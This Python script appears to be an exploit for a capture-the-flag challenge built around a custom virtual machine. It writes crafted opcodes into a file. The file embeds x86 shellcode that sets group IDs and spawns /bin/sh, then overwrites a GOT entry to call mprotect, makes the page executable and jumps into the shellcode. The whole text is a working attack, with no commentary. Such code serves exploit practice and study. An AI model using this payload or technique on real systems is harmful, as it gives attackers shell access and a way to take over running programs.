import struct

f = open('.j', 'wb')

def movr(a, b):
	return 0, 4, a, b

def movm(a, b):
	return 0, 19, a, b

def syscall(a):
	return 24, a, 0, 0

def subm(a, b):
	return 4, 19, a, b

def process(opcodes):
	for opcode in opcodes:
		a, b, c, d = opcode
		f.write(struct.pack("<HHLL", a, b, c, d))

opcodes = [

movr(0, 1),
syscall(1),

]

base = 0x804d800
got = 0x804d034
write = 0xd4230
mprotect = 0xe0fb0
code = "\x68\xD2\x00\x00\x00\x58\x68\xF1\x03\x00\x00\x59\x89\xCA\x89\xCB\xCD\x80\x31\xC9\xF7\xE1\x51\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x51\x53\x89\xE1\xB0\x0B\xCD\x80"

for i in range(0, len(code)+4, 4):
	opcodes.append(movm(base+i, struct.unpack("<L", code[i:i+4].ljust(4, '\x00'))[0]))

opcodes += [

subm(got, -write+mprotect),
movr(0, 1),
movr(1, base&0xfffff000),
movr(2, 0x1000),
movr(3, 7),
syscall(1),
movm(0x804d0f0, base),
syscall(1)

]
process(opcodes)

f.close()
